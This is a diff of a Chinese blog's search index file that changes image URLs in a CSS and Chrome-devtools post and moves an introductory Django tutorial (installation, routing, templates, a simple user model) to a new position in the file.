@@ -35,8 +35,8 @@
     <url>/posts/a5a9/</url>
     <content><![CDATA[<h2 id="CSS基础学习"><a href="#CSS基础学习" class="headerlink" title="CSS基础学习"></a>CSS基础学习</h2><h3 id="CSS是什么"><a href="#CSS是什么" class="headerlink" title="CSS是什么"></a>CSS是什么</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p>
-<h3 id="CSS语法规范"><a href="#CSS语法规范" class="headerlink" title="CSS语法规范"></a>CSS语法规范</h3><p>CSS规则由两个主要的部分构成：选择器以及一条或多条声明。<br><img src="https://img.xpctf.cn/img/20200916103214.png-xpctf" alt=""></p>
-<h3 id="CSS语法基础"><a href="#CSS语法基础" class="headerlink" title="CSS语法基础"></a>CSS语法基础</h3><p>CSS通常写在head标签中，使用style标签包含，一定要以’;’结尾，键和值之间使用’:’分割。<br><img src="https://img.xpctf.cn/img/20200916103832.png-xpctf" alt=""></p>
+<h3 id="CSS语法规范"><a href="#CSS语法规范" class="headerlink" title="CSS语法规范"></a>CSS语法规范</h3><p>CSS规则由两个主要的部分构成：选择器以及一条或多条声明。<br><img src="https://img.xpctf.cn/img/20200916103214.png" alt=""></p>
+<h3 id="CSS语法基础"><a href="#CSS语法基础" class="headerlink" title="CSS语法基础"></a>CSS语法基础</h3><p>CSS通常写在head标签中，使用style标签包含，一定要以’;’结尾，键和值之间使用’:’分割。<br><img src="https://img.xpctf.cn/img/20200916103832.png" alt=""></p>
 <h3 id="CSS代码风格"><a href="#CSS代码风格" class="headerlink" title="CSS代码风格"></a>CSS代码风格</h3><p>对应CSS，代码书写风格不是强制规范，而是符合实际开发书写方式，让代码更利于阅读或检查。</p>
 <p>1、样式格式书写</p>
 <p>① 紧凑风格</p>
@@ -111,7 +111,7 @@
 
 <h2 id="chrome调试工具"><a href="#chrome调试工具" class="headerlink" title="chrome调试工具"></a>chrome调试工具</h2><p>Chrome浏览器提供了一个非常好用的调试工具，可以用来调试我们的HTML结构和CSS样式。</p>
 <h3 id="打开Chrome调试工具"><a href="#打开Chrome调试工具" class="headerlink" title="打开Chrome调试工具"></a>打开Chrome调试工具</h3><p>1、F12快捷键<br>2、Ctrl+Shift+i快捷键<br>3、右键空白处=&gt;检查<br>4、设置=&gt;更多工具=&gt;开发者工具</p>
-<h3 id="使用Chrome调试工具"><a href="#使用Chrome调试工具" class="headerlink" title="使用Chrome调试工具"></a>使用Chrome调试工具</h3><p><img src="https://img.xpctf.cn/img/20200917102721.png-xpctf" alt=""></p>
+<h3 id="使用Chrome调试工具"><a href="#使用Chrome调试工具" class="headerlink" title="使用Chrome调试工具"></a>使用Chrome调试工具</h3><p><img src="https://img.xpctf.cn/img/20200917102721.png" alt=""></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -164,6 +164,147 @@
       </categories>
       <tags>
         <tag>Chrome插件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Django基础学习</title>
+    <url>/posts/24c5/</url>
+    <content><![CDATA[<h2 id="Django-简介"><a href="#Django-简介" class="headerlink" title="Django 简介"></a>Django 简介</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>Django 是一个由 Python 编写的一个开放源代码的 Web 应用框架。</p>
+<p>使用 Django，只要很少的代码，Python 的程序开发人员就可以轻松地完成一个正式网站所需要的大部分内容，并进一步开发出全功能的 Web 服务 Django 本身基于 MVC 模型，即 Model（模型）+ View（视图）+ Controller（控制器）设计模式，MVC 模式使后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。</p>
+<ul>
+<li>低耦合</li>
+<li>开发快捷</li>
+<li>部署方便</li>
+<li>可重用性高</li>
+<li>维护成本低</li>
+<li>…</li>
+</ul>
+<p>Python 加 Django 是快速开发、设计、部署网站的最佳组合。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
+<li>强大的数据库功能</li>
+<li>自带强大的后台功能</li>
+<li>优雅的网址</li>
+</ul>
+<h3 id="MVC-与-MTV模型"><a href="#MVC-与-MTV模型" class="headerlink" title="MVC 与 MTV模型"></a>MVC 与 MTV模型</h3><h3 id="MVC-模型"><a href="#MVC-模型" class="headerlink" title="MVC 模型"></a>MVC 模型</h3><p>MVC 模式（Model–view–controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p>
+<p>MVC 以一种插件式的、松耦合的方式连接在一起。</p>
+<ul>
+<li>模型（M）- 编写程序应有的功能，负责业务对象与数据库的映射(ORM)。</li>
+<li>视图（V）- 图形界面，负责与用户的交互(页面)。</li>
+<li>控制器（C）- 负责转发请求，对请求进行处理。</li>
+</ul>
+<p>简易图：</p>
+<p><img src="https://img.xpctf.cn/img/20201011203655.png" alt=""></p>
+<p>用户操作流程图：</p>
+<p><img src="https://img.xpctf.cn/img/20201011203751.png" alt=""></p>
+<h3 id="MTV-模型"><a href="#MTV-模型" class="headerlink" title="MTV 模型"></a>MTV 模型</h3><p>Django 的 MTV 模式本质上和 MVC 是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django 的 MTV 分别是指：</p>
+<ul>
+<li>M 表示模型（Model）：编写程序应有的功能，负责业务对象与数据库的映射(ORM)。</li>
+<li>T 表示模板 (Template)：负责如何把页面(html)展示给用户。</li>
+<li>V 表示视图（View）：负责业务逻辑，并在适当时候调用 Model和 Template。</li>
+</ul>
+<p>除了以上三层之外，还需要一个 URL 分发器，它的作用是将一个个 URL 的页面请求分发给不同的 View 处理，View 再调用相应的 Model 和 Template，MTV 的响应模式如下所示：</p>
+<p>简易图：</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2020/05/MTV-Diagram.png" alt="img"></p>
+<p>用户操作流程图：</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2020/05/1589777036-2760-fs1oSv4dOWAwC5yW.png" alt="img"></p>
+<p><strong>解析：</strong></p>
+<p>用户通过浏览器向我们的服务器发起一个请求(request)，这个请求会去访问视图函数：</p>
+<ul>
+<li>a.如果不涉及到数据调用，那么这个时候视图函数直接返回一个模板也就是一个网页给用户。</li>
+<li>b.如果涉及到数据调用，那么视图函数调用模型，模型去数据库查找数据，然后逐级返回。</li>
+</ul>
+<p>视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</p>
+<h2 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h2><p>在安装 Django 前，系统需要已经安装了Python的开发环境。接下来我们来具体看下不同系统下Django的安装。</p>
+<h3 id="Window-下安装-Django"><a href="#Window-下安装-Django" class="headerlink" title="Window 下安装 Django"></a>Window 下安装 Django</h3><p>如果你还未安装Python环境需要先下载Python安装包。</p>
+<p>1、Python 下载地址：<a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p>
+<p>2、Django 下载地址：<a href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
+<p><strong>注意：</strong>目前 Django 2.2.x 以上版本已经完全兼容 Python 3.x。</p>
+<h3 id="Python-安装-已安装的可跳过"><a href="#Python-安装-已安装的可跳过" class="headerlink" title="Python 安装(已安装的可跳过)"></a>Python 安装(已安装的可跳过)</h3><p>安装 Python 你只需要下载 python-x.x.x.msi 文件，然后一直点击 “Next” 按钮即可。</p>
+<p><img src="https://www.runoob.com/wp-content/uploads/2015/01/install1.png" alt="img"></p>
+<h3 id="Django-安装-1"><a href="#Django-安装-1" class="headerlink" title="Django 安装"></a>Django 安装</h3><p>使用pip安装Django即可,加-i参数使用阿里云的pipy源,速度快.<br>命令:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install Django==2.2 -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
+
+<h3 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h3><p>输入以下命令进行检查:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import django</span><br><span class="line">&gt;&gt;&gt; django.get_version()</span><br><span class="line">&#x27;2.2&#x27;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>如果输出了Django的版本号说明安装正确。</p>
+<h2 id="Django-创建项目"><a href="#Django-创建项目" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h2><p>本章我们将介绍Django 管理工具及如何使用 Django 来创建项目，第一个项目我们以 HelloWorld 来命令项目。</p>
+<p>测试版本说明：</p>
+<ul>
+<li>Python 3.6.8</li>
+<li>Django 2.2<h3 id="Django-管理工具"><a href="#Django-管理工具" class="headerlink" title="Django 管理工具"></a>Django 管理工具</h3></li>
+</ul>
+<p>安装 Django 之后，您现在应该已经有了可用的管理工具 django-admin.py，Windows 如果没有配置环境变量可以用 django-admin。</p>
+<p>我们可以使用 django-admin.py 来创建一个项目:<br>我们可以来看下django-admin 的命令介绍:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">Type</span> &#x27;django-admin <span class="built_in">help</span> &lt;subcommand&gt;&#x27; <span class="keyword">for</span> <span class="built_in">help</span> on a specific subcommand.</span><br><span class="line"></span><br><span class="line">Available subcommands:</span><br><span class="line"></span><br><span class="line">[django]</span><br><span class="line">    check</span><br><span class="line">    compilemessages</span><br><span class="line">    createcachetable</span><br><span class="line">    dbshell</span><br><span class="line">    diffsettings</span><br><span class="line">    dumpdata</span><br><span class="line">    flush</span><br><span class="line">    inspectdb</span><br><span class="line">    loaddata</span><br><span class="line">    makemessages</span><br><span class="line">    makemigrations</span><br><span class="line">    migrate</span><br><span class="line">    runserver</span><br><span class="line">    sendtestemail</span><br><span class="line">    shell</span><br><span class="line">    showmigrations</span><br><span class="line">    sqlflush</span><br><span class="line">    sqlmigrate</span><br><span class="line">    sqlsequencereset</span><br><span class="line">    squashmigrations</span><br><span class="line">    startapp</span><br><span class="line">    startproject</span><br><span class="line">    test</span><br><span class="line">    testserver</span><br></pre></td></tr></table></figure>
+
+<h3 id="Django-创建项目-1"><a href="#Django-创建项目-1" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h3><p>使用 django-admin 来创建 Hello 项目：</p>
+<blockquote>
+<p>django-admin startproject Hello</p>
+</blockquote>
+<p>使用tree /F来查看目录结构：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">tree</span> /F</span><br><span class="line"><span class="function">D:.</span></span><br><span class="line"><span class="function">│  <span class="title">manage.py</span></span></span><br><span class="line"><span class="function">│</span></span><br><span class="line"><span class="function">└─<span class="title">Hello</span></span></span><br><span class="line"><span class="function">        <span class="title">settings.py</span></span></span><br><span class="line"><span class="function">        <span class="title">urls.py</span></span></span><br><span class="line"><span class="function">        <span class="title">wsgi.py</span></span></span><br><span class="line"><span class="function">        <span class="title">__init__.py</span></span></span><br></pre></td></tr></table></figure>
+
+<p>目录说明：</p>
+<ul>
+<li><strong>HelloWorld:</strong> 项目的容器。</li>
+<li><strong>manage.py:</strong> 一个实用的命令行工具，可让你以各种方式与该 Django 项目进行交互。</li>
+<li><strong>HelloWorld/<strong>init</strong>.py:</strong> 一个空文件，告诉 Python 该目录是一个 Python 包。</li>
+<li><strong>HelloWorld/settings.py:</strong> 该 Django 项目的设置/配置。</li>
+<li><strong>HelloWorld/urls.py:</strong> 该 Django 项目的 URL 声明; 一份由 Django 驱动的网站”目录”。</li>
+<li><strong>HelloWorld/wsgi.py:</strong> 一个 WSGI 兼容的 Web 服务器的入口，以便运行你的项目。</li>
+</ul>
+<p>接下来我们进入 Hello 目录输入以下命令，启动服务器：</p>
+<blockquote>
+<p>py -3 manage.py runserver 0.0.0.0:8000</p>
+</blockquote>
+<p>0.0.0.0 让其它电脑可连接到开发服务器，8000 为端口号。如果不说明，那么端口号默认为 8000。<br>在浏览器输入你服务器的 ip（这里我们输入本机 IP 地址： 127.0.0.1:8000） 及端口号，如果正常启动，输出结果如下：<br><img src="https://img.xpctf.cn/img/20201012123556.png" alt=""></p>
+<h3 id="Django-创建应用"><a href="#Django-创建应用" class="headerlink" title="Django 创建应用"></a>Django 创建应用</h3><p>使用<code>py -3 manage.py startapp App</code>创建一个应用，<br>目录结构：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">Desktop</span>\<span class="title">django</span>\<span class="title">Hello</span>&gt;<span class="title">tree</span> <span class="title">App</span> /<span class="title">F</span></span></span><br><span class="line"><span class="function">卷 软件 的文件夹 <span class="title">PATH</span> 列表</span></span><br><span class="line"><span class="function">卷序列号为 2901-4<span class="title">EB1</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">USERS</span>\<span class="title">ADMINISTRATOR</span>\<span class="title">DESKTOP</span>\<span class="title">DJANGO</span>\<span class="title">HELLO</span>\<span class="title">APP</span></span></span><br><span class="line"><span class="function">│  <span class="title">admin.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">apps.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">models.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">tests.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">views.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">__init__.py</span></span></span><br><span class="line"><span class="function">│</span></span><br><span class="line"><span class="function">└─<span class="title">migrations</span></span></span><br><span class="line"><span class="function">        <span class="title">__init__.py</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Django-项目配置"><a href="#Django-项目配置" class="headerlink" title="Django 项目配置"></a>Django 项目配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASE_DIR	#项目路径</span><br><span class="line">SECRET_KEY	#签名key</span><br><span class="line">DEBUG		#调试模式</span><br><span class="line">ALLOWED_HOSTS	#允许访问列表 ALLOWED_HOSTS = [&#x27;*&#x27;] #允许所有访问</span><br><span class="line">INSTALLED_APPS	#安装应用 自己创建的应用需要加入到该列表，应用名即可</span><br><span class="line">MIDDLEWARE	#中间件</span><br><span class="line">ROOT_URLCONF	#根路由 Django中各个应用有个路由</span><br><span class="line">TEMPLATES	#模板配置</span><br><span class="line">	BACKEND	#模板引擎</span><br><span class="line">	DIRS	#模板路径</span><br><span class="line">WSGI_APPLICATION	#项目入口</span><br><span class="line">DATABASES	#数据库配置</span><br><span class="line">AUTH_PASSWORD_VALIDATORS	#访问验证</span><br><span class="line">LANGUAGE_CODE = &#x27;zh-hans&#x27;	#简体中文语言</span><br><span class="line">TIME_ZONE = &#x27;Asia/Shanghai&#x27;	#上海时区</span><br><span class="line">USE_TZ = False	#不适用国际标准时间</span><br><span class="line">STATIC_URL	#静态资源请求路径</span><br></pre></td></tr></table></figure>
+<p>设置后继续runserver，默认界面变成中文显示。<br><img src="https://img.xpctf.cn/img/20201012132637.png" alt=""></p>
+<h3 id="自定义主页"><a href="#自定义主页" class="headerlink" title="自定义主页"></a>自定义主页</h3><p>修改urls.py文件，在urlpatterns列表里增加<code>path(&#39;&#39;,views.index,name=&#39;index&#39;)</code>，在views.py定义index函数:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello World&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="pycharm创建项目"><a href="#pycharm创建项目" class="headerlink" title="pycharm创建项目"></a>pycharm创建项目</h3><p>File=&gt;New project=&gt;Django=&gt;配置项目路径=&gt;配置Python路径=&gt;配置模板=&gt;配置应用名称=&gt;create<br><img src="https://img.xpctf.cn/img/20201012134758.png" alt=""></p>
+<h2 id="Django-路由"><a href="#Django-路由" class="headerlink" title="Django 路由"></a>Django 路由</h2><h3 id="创建子路由"><a href="#创建子路由" class="headerlink" title="创建子路由"></a>创建子路由</h3><p>Hello目录下的路由是根路由，每个应用都可以有自己的路由，应用路由互相不影响。</p>
+<p>在应用目录新建urls.py文件，写入：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path <span class="comment">#导入path模块</span></span><br><span class="line"><span class="keyword">from</span> App <span class="keyword">import</span> views   <span class="comment">#导入应用views文件</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;home/&#x27;</span>,views.home,name=<span class="string">&#x27;home&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>在views.py里定义函数：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Home&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>在根路由列表里包含子路由列表：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line">path(<span class="string">&#x27;&#x27;</span>,include(<span class="string">&quot;App.urls&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>pycharm技巧：选中views按Alt+Enter键可以导入快速导入模块，选中home可以自动生成home函数。</p>
+<h2 id="Django-模板和模型"><a href="#Django-模板和模型" class="headerlink" title="Django 模板和模型"></a>Django 模板和模型</h2><h3 id="设置模型路径"><a href="#设置模型路径" class="headerlink" title="设置模型路径"></a>设置模型路径</h3><p>在Hello目录下载新建templates文件夹，用来存储模板，修改settings.py的TEMPLATES列表下的DIRS值为[os.path.join(BASE_DIR, ‘templates’)]。<br><img src="https://img.xpctf.cn/img/20201012163739.png" alt=""></p>
+<h3 id="新建模型"><a href="#新建模型" class="headerlink" title="新建模型"></a>新建模型</h3><p>在templates文件夹中新建index.html文件：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello, &#123;&#123; name &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>注意：</strong>模板文件中不能出现中文</p>
+<h3 id="使用模板"><a href="#使用模板" class="headerlink" title="使用模板"></a>使用模板</h3><p>render是Django提供的一个渲染Html的模块<br>request是一个固定参数, 没什么好讲的<br>index.html是模板文件<br>context是要传入文件中用于渲染呈现的数据, 默认是字典格式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;Django&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;china&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;index.html&quot;</span>,context=context)</span><br></pre></td></tr></table></figure>
+
+<h3 id="连接sqllite3数据库"><a href="#连接sqllite3数据库" class="headerlink" title="连接sqllite3数据库"></a>连接sqllite3数据库</h3><p>如果pycharm是专业版，点击最右边的database选项，在弹出的界面选择data source，找到SQLlite数据库，按照下图配置即可。<br><img src="https://img.xpctf.cn/img/20201012170716.png" alt=""></p>
+<h3 id="新建模型-1"><a href="#新建模型-1" class="headerlink" title="新建模型"></a>新建模型</h3><p>创建User类，继承models.Model属性，创建UserName和PassWord列名，并指定表名。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line">class User(models.Model):</span><br><span class="line">    UserName = models.CharField(max_length=10)</span><br><span class="line">    PassWord = models.CharField(max_length=128)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        db_table = &#x27;Users&#x27; #指定表名</span><br></pre></td></tr></table></figure>
+
+<p>使用下面命令更新models并创建数据库：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">py -<span class="number">3</span> manage.py makemigrations	#让 Django 知道我们在我们的模型有一些变更</span><br><span class="line">py -<span class="number">3</span> manage.py migrate	## 创建表结构</span><br></pre></td></tr></table></figure>
+<p>完成后Django会自动创建表，并插入列名，ID列名自动增加并设置为主键。</p>
+<h3 id="数据库加入数据"><a href="#数据库加入数据" class="headerlink" title="数据库加入数据"></a>数据库加入数据</h3><p>选中database后双击User数据库，点击上面的+号，编辑你要加入的内容，点击&gt;&gt;展开，点击有DB的按钮提交到数据库即可。<br><img src="https://img.xpctf.cn/img/20201012191622.png" alt=""></p>
+<h3 id="反向生成模型"><a href="#反向生成模型" class="headerlink" title="反向生成模型"></a>反向生成模型</h3><p>反向生成模型是根据数据库列名来生成模型，Django给我提供了这个功能，只需要使用：<br><code>py -3 manage.py inspectdb Users &gt; App/Users.py</code><br>生成Users表的模型保存到App/Users.py，如果忽略Users，当前连接的数据所有表Model<br><img src="https://img.xpctf.cn/img/20201012200915.png" alt=""></p>
+<h3 id="遍历数据库用户"><a href="#遍历数据库用户" class="headerlink" title="遍历数据库用户"></a>遍历数据库用户</h3><p>在templates文件夹创建user_list.html文件，写入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    &#123;% for user in users %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; user.UserName &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在App路由列表”urls.py”中增加<code>path(&#39;list/&#39;,views.user_list,name=&#39;user_list&#39;)</code></p>
+<p>在views.py中添加内容：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_list</span>(<span class="params">request</span>):</span></span><br><span class="line">    users = User.objects.<span class="built_in">all</span>()</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;用户列表&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;users&#x27;</span>:users,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;user_list.html&quot;</span>,context=context)</span><br></pre></td></tr></table></figure>
+
+<h2 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h2><p>Django基础学习：<a href="https://www.xpctf.cn/posts/24c5/">https://www.xpctf.cn/posts/24c5/</a><br>Django晋级学习：<a href="https://www.xpctf.cn/posts/2f99/">https://www.xpctf.cn/posts/2f99/</a><br>Django模型学习：<a href="https://www.xpctf.cn/posts/d0b4/">https://www.xpctf.cn/posts/d0b4/</a><br>Django会话学习：<a href="https://www.xpctf.cn/posts/7490/">https://www.xpctf.cn/posts/7490/</a><br>Django Form学习：正在写</p>
+]]></content>
+      <categories>
+        <category>Python</category>
+        <category>Django</category>
+      </categories>
+      <tags>
+        <tag>Django</tag>
       </tags>
   </entry>
   <entry>
@@ -290,160 +431,19 @@
       </tags>
   </entry>
   <entry>
-    <title>Django基础学习</title>
-    <url>/posts/24c5/</url>
-    <content><![CDATA[<h2 id="Django-简介"><a href="#Django-简介" class="headerlink" title="Django 简介"></a>Django 简介</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>Django 是一个由 Python 编写的一个开放源代码的 Web 应用框架。</p>
-<p>使用 Django，只要很少的代码，Python 的程序开发人员就可以轻松地完成一个正式网站所需要的大部分内容，并进一步开发出全功能的 Web 服务 Django 本身基于 MVC 模型，即 Model（模型）+ View（视图）+ Controller（控制器）设计模式，MVC 模式使后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。</p>
-<ul>
-<li>低耦合</li>
-<li>开发快捷</li>
-<li>部署方便</li>
-<li>可重用性高</li>
-<li>维护成本低</li>
-<li>…</li>
-</ul>
-<p>Python 加 Django 是快速开发、设计、部署网站的最佳组合。</p>
-<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
-<li>强大的数据库功能</li>
-<li>自带强大的后台功能</li>
-<li>优雅的网址</li>
-</ul>
-<h3 id="MVC-与-MTV模型"><a href="#MVC-与-MTV模型" class="headerlink" title="MVC 与 MTV模型"></a>MVC 与 MTV模型</h3><h3 id="MVC-模型"><a href="#MVC-模型" class="headerlink" title="MVC 模型"></a>MVC 模型</h3><p>MVC 模式（Model–view–controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p>
-<p>MVC 以一种插件式的、松耦合的方式连接在一起。</p>
-<ul>
-<li>模型（M）- 编写程序应有的功能，负责业务对象与数据库的映射(ORM)。</li>
-<li>视图（V）- 图形界面，负责与用户的交互(页面)。</li>
-<li>控制器（C）- 负责转发请求，对请求进行处理。</li>
-</ul>
-<p>简易图：</p>
-<p><img src="https://img.xpctf.cn/img/20201011203655.png-xpctf" alt=""></p>
-<p>用户操作流程图：</p>
-<p><img src="https://img.xpctf.cn/img/20201011203751.png-xpctf" alt=""></p>
-<h3 id="MTV-模型"><a href="#MTV-模型" class="headerlink" title="MTV 模型"></a>MTV 模型</h3><p>Django 的 MTV 模式本质上和 MVC 是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django 的 MTV 分别是指：</p>
-<ul>
-<li>M 表示模型（Model）：编写程序应有的功能，负责业务对象与数据库的映射(ORM)。</li>
-<li>T 表示模板 (Template)：负责如何把页面(html)展示给用户。</li>
-<li>V 表示视图（View）：负责业务逻辑，并在适当时候调用 Model和 Template。</li>
-</ul>
-<p>除了以上三层之外，还需要一个 URL 分发器，它的作用是将一个个 URL 的页面请求分发给不同的 View 处理，View 再调用相应的 Model 和 Template，MTV 的响应模式如下所示：</p>
-<p>简易图：</p>
-<p><img src="https://www.runoob.com/wp-content/uploads/2020/05/MTV-Diagram.png" alt="img"></p>
-<p>用户操作流程图：</p>
-<p><img src="https://www.runoob.com/wp-content/uploads/2020/05/1589777036-2760-fs1oSv4dOWAwC5yW.png" alt="img"></p>
-<p><strong>解析：</strong></p>
-<p>用户通过浏览器向我们的服务器发起一个请求(request)，这个请求会去访问视图函数：</p>
-<ul>
-<li>a.如果不涉及到数据调用，那么这个时候视图函数直接返回一个模板也就是一个网页给用户。</li>
-<li>b.如果涉及到数据调用，那么视图函数调用模型，模型去数据库查找数据，然后逐级返回。</li>
-</ul>
-<p>视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。</p>
-<h2 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h2><p>在安装 Django 前，系统需要已经安装了Python的开发环境。接下来我们来具体看下不同系统下Django的安装。</p>
-<h3 id="Window-下安装-Django"><a href="#Window-下安装-Django" class="headerlink" title="Window 下安装 Django"></a>Window 下安装 Django</h3><p>如果你还未安装Python环境需要先下载Python安装包。</p>
